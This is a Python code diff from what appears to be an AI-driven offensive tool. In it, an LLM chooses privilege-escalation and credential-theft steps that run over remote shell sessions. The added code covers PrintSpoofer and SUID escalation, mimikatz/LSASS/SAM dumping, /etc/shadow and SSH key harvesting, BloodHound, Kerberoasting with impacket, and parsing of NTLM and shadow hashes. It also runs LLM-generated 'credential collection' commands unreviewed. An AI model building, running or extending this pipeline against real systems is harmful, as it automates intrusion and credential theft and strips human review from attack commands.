-            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
-        }
+        print(f"[PrivEsc] AI决策失败: {e}")
+        # 降级策略
+        if os_type == "windows":
+            return {
+                "method": "PrintSpoofer",
+                "commands": ["PrintSpoofer64.exe -i -c cmd"],
+                "reason": "降级默认",
+                "on_failure": "retry"
+            }
+        else:
+            return {
+                "method": "SUID二进制",
+                "commands": ["find / -perm -4000 2>/dev/null"],
+                "reason": "降级默认",
+                "on_failure": "retry"
+            }
+
+
+def _execute_privesc_via_session(shell_session: Dict, strategy: Dict, os_type: str) -> Dict:
+    """通过远程会话执行提权"""
+    session_id = shell_session.get("session_id", "")
+    if not session_id:
+        return {"success": False, "error": "无有效会话"}
+
+    session_manager = get_session_manager()
+    session = session_manager.get_session(session_id)
+
+    if not session:
+        return {"success": False, "error": "会话不存在"}
+
+    commands = strategy.get("commands", [])
+    results = []
+
+    for cmd in commands:
+        print(f"[PrivEsc] 执行: {cmd[:50]}...")
+        result = execute_on_session(session, cmd, timeout=60)
+        results.append({
+            "cmd": cmd,
+            "success": result.success,
+            "output": result.output[:500]
+        })
+
+        if result.success:
+            # 检查是否提权成功
+            verify_cmd = "whoami /priv" if os_type == "windows" else "id"
+            verify_result = execute_on_session(session, verify_cmd, timeout=10)
+
+            if os_type == "windows":
+                if "SeImpersonatePrivilege" in verify_result.output or "SYSTEM" in verify_result.output:
+                    return {"success": True, "is_system": "SYSTEM" in verify_result.output}
+            else:
+                if "uid=0" in verify_result.output:
+                    return {"success": True, "is_system": True}
+
+    return {"success": False, "error": "所有提权尝试失败"}
+
+
+def _execute_privesc_advanced(session: Dict, strategy: Dict) -> Dict:
+    """使用高级操作模块执行提权"""
+    if not ADVANCED_OPS_AVAILABLE:
+        return {"success": False, "error": "高级操作模块不可用"}
+
+    method = strategy.get("method", "")
+    result = PrivilegeEscalation.attempt_escalation(session, method)
+
+    return {
+        "success": result.status == OperationStatus.SUCCESS,
+        "is_system": result.status == OperationStatus.SUCCESS,
+        "error": result.message if result.status != OperationStatus.SUCCESS else ""
+    }
+
+
+def _ai_credential_dump(state: Dict, session: Dict,
+                        active_sessions: List, credentials: List,
+                        shell_session: Dict) -> Dict:
+    """AI驱动的凭据转储"""
+    new_credentials = list(credentials)
+    target = session.get("host", "")
+    os_type = session.get("os_type", shell_session.get("os_type", "linux"))
+
+    print(f"[CredDump] AI决策凭据收集策略...")
+
+    # AI决策凭据收集方法
+    prompt = f"""
+决策凭据收集策略。
+
+## 目标
+- IP: {target}
+- 系统: {os_type}
+- 权限: 管理员
+
+## 可用方法
+{os_type == "windows" and "mimikatz, LSASS转储, SAM转储, DCSync" or "/etc/shadow, SSH密钥, 历史命令, 配置文件"}
+
+## 输出格式 (JSON)
+{{
+    "methods": ["方法列表，按优先级"],
+    "commands": ["命令列表"]
+}}
+"""
+
+    try:
+        response = llm_client.call_chat_completion(
+            model=config.ANALYST_MODEL,
+            messages=[{"role": "user", "content": prompt}],
+            temperature=0.1,
+            json_mode=True
+        )
+
+        if "```json" in response:
+            response = response.split("```json")[1].split("```")[0]
+
+        strategy = json.loads(response.strip())
+        print(f"[CredDump] AI选择: {', '.join(strategy.get('methods', []))}")
+
+    except Exception:
+        strategy = {"methods": ["默认"], "commands": []}
+
+    # 执行凭据收集
+    if shell_session.get("session_id") and REMOTE_EXEC_AVAILABLE:
+        session_manager = get_session_manager()
+        exec_session = session_manager.get_session(shell_session["session_id"])
+
+        if exec_session:
+            for cmd in strategy.get("commands", []):
+                try:
+                    result = execute_on_session(exec_session, cmd, timeout=60)
+                    if result.success:
+                        # 解析凭据
+                        parsed = _parse_credentials_from_output(result.output, os_type)
+                        new_credentials.extend(parsed)
+                except Exception:
+                    pass
+
+    # 使用高级模块作为备选
+    if ADVANCED_OPS_AVAILABLE and not new_credentials:
+        try:
+            if os_type == "windows":
+                result = CredentialDumper.dump_lsass(session)
+                if result.status == OperationStatus.SUCCESS:
+                    print(f"[CredDump] LSASS转储成功")
+            else:
+                result = CredentialDumper.dump_linux_hashes(session)
+                if result.status == OperationStatus.SUCCESS:
+                    hashes = result.data.get("hashes", [])
+                    for h in hashes:
+                        new_credentials.append({
+                            "host": target,
+                            "username": h.get("username"),
+                            "hash": h.get("hash"),
+                            "cred_type": "password_hash"
+                        })
+        except Exception as e:
+            print(f"[CredDump] 失败: {e}")
+
+    return {
+        "active_sessions": active_sessions,
+        "credentials": new_credentials if len(new_credentials) > len(credentials) else credentials,
+        "execution_steps": state.get("execution_steps", 0) + 1
+    }
+
+
+def _parse_credentials_from_output(output: str, os_type: str) -> List[Dict]:
+    """从命令输出解析凭据"""
+    import re
+    credentials = []
+
+    # Windows凭据模式
+    if os_type == "windows":
+        # NTLM哈希
+        ntlm_pattern = r"(\w+)::[\w]+:([a-f0-9]+):([a-f0-9]+)"
+        for match in re.finditer(ntlm_pattern, output, re.IGNORECASE):
+            credentials.append({
+                "username": match.group(1),
+                "hash": f"{match.group(2)}:{match.group(3)}",
+                "cred_type": "ntlm"
+            })
+    else:
+        # Linux shadow文件
+        hash_pattern = r"(\w+):(\$[\w$\.\/]+)"
+        for match in re.finditer(hash_pattern, output):
+            credentials.append({
+                "username": match.group(1),
+                "hash": match.group(2),
+                "cred_type": "password_hash"
+            })
+
+    return credentials
 
 
 def _attempt_credential_dump(state: Dict, session: Dict,
@@ -572,22 +1348,26 @@ def _attempt_credential_dump(state: Dict, session: Dict,
 
 def credential_gather_node(state: Dict) -> Dict:
     """
-    [凭据收集节点] 从目标主机收集凭据
+    [凭据收集节点] AI驱动的凭据收集
 
     输入:
         - current_internal_target: 当前目标
         - internal_hosts: 已发现的主机
+        - proxy_info: 代理信息
+        - shell_session: 会话信息
 
     输出:
         - credentials: 收集到的凭据
 
-    工作流程:
-        1. 检查目标服务
-        2. 尝试常见攻击（如SMB匿名登录）
-        3. 记录发现
+    AI决策:
+        1. 分析目标服务选择收集方法
+        2. 决定是否需要使用代理
+        3. 处理收集结果
     """
     target = state.get("current_internal_target", "")
     internal_hosts = state.get("internal_hosts") or []
+    proxy_info = state.get("proxy_info", {})
+    shell_session = state.get("shell_session", {})
 
     if not target:
         return {"error": "没有指定目标"}
@@ -609,10 +1389,127 @@ def credential_gather_node(state: Dict) -> Dict:
 
     credentials = state.get("credentials") or []
 
-    print(f"[CredGather] 尝试从 {target} 收集凭据...")
+    print(f"[CredGather] AI分析 {target} 的凭据收集策略...")
 
-    # 尝试SMB匿名登录
-    if 445 in port_numbers:
+    # AI决策凭据收集策略
+    gather_strategy = _ai_decide_cred_gather_strategy(target, target_host, credentials, state)
+
+    print(f"[CredGather] AI决策: {gather_strategy.get('method')} - {gather_strategy.get('reason', '')}")
+
+    new_credentials = []
+
+    # 执行凭据收集
+    method = gather_strategy.get("method", "")
+
+    try:
+        if method == "smb_anonymous":
+            result = _execute_smb_anonymous(target, proxy_info)
+            if result.get("success"):
+                new_credentials.extend(result.get("credentials", []))
+
+        elif method == "ldap_enum":
+            result = _execute_ldap_enum(target, credentials, proxy_info)
+            if result.get("success"):
+                new_credentials.extend(result.get("credentials", []))
+
+        elif method == "bloodhound":
+            result = _execute_bloodhound(target, credentials, proxy_info)
+            if result.get("success"):
+                new_credentials.extend(result.get("credentials", []))
+                return {
+                    "credentials": credentials + new_credentials,
+                    "analyst_intel": result.get("intel", ""),
+                    "attack_paths": result.get("attack_paths", []),
+                    "execution_steps": state.get("execution_steps", 0) + 1
+                }
+
+        elif method == "session_dump":
+            if shell_session.get("session_id") and REMOTE_EXEC_AVAILABLE:
+                result = _execute_session_cred_dump(shell_session)
+                new_credentials.extend(result.get("credentials", []))
+
+        elif method == "kerberoast":
+            result = _execute_kerberoast(target, credentials, proxy_info)
+            if result.get("success"):
+                new_credentials.extend(result.get("credentials", []))
+
+    except Exception as e:
+        print(f"[CredGather] 执行失败: {e}")
+
+    if new_credentials:
+        print(f"[CredGather] 收集到 {len(new_credentials)} 条凭据")
+    else:
+        print(f"[CredGather] 未收集到新凭据")
+
+    return {
+        "credentials": credentials + new_credentials,
+        "current_internal_target": target,
+        "execution_steps": state.get("execution_steps", 0) + 1
+    }
+
+
+def _ai_decide_cred_gather_strategy(target: str, target_host: Dict, credentials: List, state: Dict) -> Dict:
+    """
+    AI决策凭据收集策略
+    """
+    ports = target_host.get("ports") or []
+    port_numbers = [p.get("port") for p in ports if isinstance(p, dict)]
+
+    # 压缩凭据信息
+    has_domain_creds = any(c.get("domain") for c in credentials)
+    creds_count = len(credentials)
+
+    prompt = f"""
+分析目标，决策最佳凭据收集策略。
+
+## 目标信息
+- IP: {target}
+- 开放端口: {port_numbers}
+- 已有凭据: {creds_count} 条
+- 有域凭据: {'是' if has_domain_creds else '否'}
+
+## 可用方法
+- smb_anonymous: SMB匿名登录，无需凭据
+- ldap_enum: LDAP枚举，需要域凭据
+- bloodhound: BloodHound分析，需要域凭据
+- session_dump: 会话凭据转储，需要有shell
+- kerberoast: Kerberoasting，需要域凭据
+
+## 输出格式 (JSON)
+{{
+    "method": "方法名称",
+    "reason": "选择理由",
+    "priority": "high/medium/low"
+}}
+"""
+
+    try:
+        response = llm_client.call_chat_completion(
+            model=config.ANALYST_MODEL,
+            messages=[{"role": "user", "content": prompt}],
+            temperature=0.1,
+            json_mode=True
+        )
+
+        if "```json" in response:
+            response = response.split("```json")[1].split("```")[0]
+
+        return json.loads(response.strip())
+
+    except Exception as e:
+        print(f"[CredGather] AI决策失败: {e}")
+        # 降级: 基于端口选择
+        if 445 in port_numbers:
+            return {"method": "smb_anonymous", "reason": "SMB开放"}
+        elif 389 in port_numbers and has_domain_creds:
+            return {"method": "ldap_enum", "reason": "LDAP开放且有域凭据"}
+        else:
+            return {"method": "session_dump", "reason": "默认"}
+
+
+def _execute_smb_anonymous(target: str, proxy_info: Dict) -> Dict:
+    """执行SMB匿名登录"""
+    try:
         result = ToolRegistry.execute_cached(
             "crackmapexec",
             target,
@@ -623,71 +1520,162 @@ def credential_gather_node(state: Dict) -> Dict:
             }
         )
 
-        if result.get("result", {}).get("success"):
-            # 检查是否有匿名共享
+        if result and result.get("result", {}).get("success"):
             shares = result.get("result", {}).get("shares", [])
-            if shares:
-                print(f"[CredGather] 发现 {len(shares)} 个SMB共享")
+            return {
+                "success": True,
+                "credentials": [{"host": target, "type": "smb_anonymous"}]
+            }
+    except Exception:
+        pass
 
-    # 尝试LDAP匿名绑定或使用已获取凭据
-    if 389 in port_numbers or 636 in port_numbers:
-        # 检查是否有可用的域凭据
-        domain = state.get("ad_domain", "")
-        domain_creds = [c for c in credentials if c.get("domain") == domain] if domain else []
+    return {"success": False}
 
-        if domain_creds or domain:
-            # 使用第一个可用凭据
-            cred = domain_creds[0] if domain_creds else {}
-            username = cred.get("username", "")
-            password = cred.get("password", "")
-            hash_val = cred.get("hash", "")
 
-            if username and (password or hash_val):
-                print(f"[CredGather] 尝试BloodHound数据采集...")
+def _execute_ldap_enum(target: str, credentials: List, proxy_info: Dict) -> Dict:
+    """执行LDAP枚举"""
+    # 找一个域凭据
+    domain_cred = next((c for c in credentials if c.get("domain")), None)
+    if not domain_cred:
+        return {"success": False}
 
-                result = ToolRegistry.execute_cached(
-                    "bloodhound",
-                    target,
-                    {
-                        "domain": domain,
-                        "dc": target,
-                        "username": username,
-                        "password": password,
-                        "hash": hash_val,
-                        "collection": "all"
-                    }
-                )
+    try:
+        result = ToolRegistry.execute_cached(
+            "bloodhound-python",
+            target,
+            {
+                "domain": domain_cred.get("domain", ""),
+                "dc": target,
+                "username": domain_cred.get("username", ""),
+                "password": domain_cred.get("password", ""),
+                "hash": domain_cred.get("hash", "")
+            }
+        )
 
-                # 处理BloodHound结果
-                if result.get("result", {}).get("success"):
-                    bh_data = result.get("result", {})
-                    # 发现的攻击路径
-                    attack_paths = bh_data.get("attack_paths", [])
-                    high_value_targets = bh_data.get("high_value_targets", [])
+        if result and result.get("result", {}).get("success"):
+            return {
+                "success": True,
+                "credentials": result.get("result", {}).get("credentials", [])
+            }
+    except Exception:
+        pass
 
-                    if attack_paths:
-                        print(f"[CredGather] BloodHound发现 {len(attack_paths)} 条攻击路径")
+    return {"success": False}
 
-                    # 更新analyst_intel
-                    intel = f"[BloodHound] {bh_data.get('summary', '采集完成')}"
-                    if high_value_targets:
-                        intel += f"\n高价值目标: {', '.join(high_value_targets[:5])}"
 
-                    return {
-                        "credentials": credentials,
-                        "current_internal_target": target,
-                        "analyst_intel": intel,
-                        "attack_paths": attack_paths,
-                        "high_value_targets": high_value_targets,
-                        "execution_steps": state.get("execution_steps", 0) + 1
-                    }
-                elif result.get("error"):
-                    print(f"[CredGather] BloodHound失败: {result.get('error')}")
-            else:
-                print(f"[CredGather] 缺少有效的域凭据，跳过BloodHound")
+def _execute_bloodhound(target: str, credentials: List, proxy_info: Dict) -> Dict:
+    """执行BloodHound数据采集"""
+    domain_cred = next((c for c in credentials if c.get("domain")), None)
+    if not domain_cred:
+        return {"success": False}
 
-    return {
-        "credentials": credentials,
-        "current_internal_target": target,
-        "execution_steps": state.get("execution_steps", 0) + 1
-    }
+    try:
+        result = ToolRegistry.execute_cached(
+            "bloodhound",
+            target,
+            {
+                "domain": domain_cred.get("domain", ""),
+                "dc": target,
+                "username": domain_cred.get("username", ""),
+                "password": domain_cred.get("password", ""),
+                "hash": domain_cred.get("hash", ""),
+                "collection": "all"
+            }
+        )
+
+        if result and result.get("result", {}).get("success"):
+            bh_data = result.get("result", {})
+            return {
+                "success": True,
+                "credentials": [],
+                "intel": bh_data.get("summary", "BloodHound采集完成"),
+                "attack_paths": bh_data.get("attack_paths", [])
+            }
+    except Exception:
+        pass
+
+    return {"success": False}
+
+
+def _execute_session_cred_dump(shell_session: Dict) -> Dict:
+    """通过会话执行凭据转储"""
+    session_id = shell_session.get("session_id", "")
+    os_type = shell_session.get("os_type", "linux")
+
+    if not session_id:
+        return {"credentials": []}
+
+    session_manager = get_session_manager()
+    session = session_manager.get_session(session_id)
+
+    if not session:
+        return {"credentials": []}
+
+    credentials = []
+
+    # AI生成凭据收集命令
+    prompt = f"""
+生成凭据收集命令。
+
+## 系统
+- 类型: {os_type}
+
+## 要求
+输出2-3个命令，用于收集敏感信息或凭据。
+格式: JSON数组 ["cmd1", "cmd2"]
+"""
+
+    try:
+        response = llm_client.call_chat_completion(
+            model=config.ANALYST_MODEL,
+            messages=[{"role": "user", "content": prompt}],
+            temperature=0.1
+        )
+
+        if "```json" in response:
+            response = response.split("```json")[1].split("```")[0]
+
+        commands = json.loads(response.strip())
+
+        for cmd in commands:
+            result = execute_on_session(session, cmd, timeout=30)
+            if result.success:
+                # 解析凭据
+                parsed = _parse_credentials_from_output(result.output, os_type)
+                credentials.extend(parsed)
+
+    except Exception:
+        pass
+
+    return {"credentials": credentials}
+
+
+def _execute_kerberoast(target: str, credentials: List, proxy_info: Dict) -> Dict:
+    """执行Kerberoasting"""
+    domain_cred = next((c for c in credentials if c.get("domain")), None)
+    if not domain_cred:
+        return {"success": False}
+
+    try:
+        result = ToolRegistry.execute_cached(
+            "impacket",
+            target,
+            {
+                "script": "GetUserSPNs.py",
+                "target": f"{domain_cred.get('domain')}/{domain_cred.get('username')}:{domain_cred.get('password')}@{target}"
+            }
+        )
+
+        if result and result.get("result", {}).get("success"):
+            # 解析Kerberoast哈希
+            output = result.get("result", {}).get("output", "")
+            # 简化: 检查是否有SPN
+            if "$krb5tgs$" in output or "SPN" in output:
+                return {
+                    "success": True,
+                    "credentials": [{"type": "kerberoast_hash", "data": output[:500]}]
+                }
+    except Exception:
+        pass
+
+    return {"success": False}
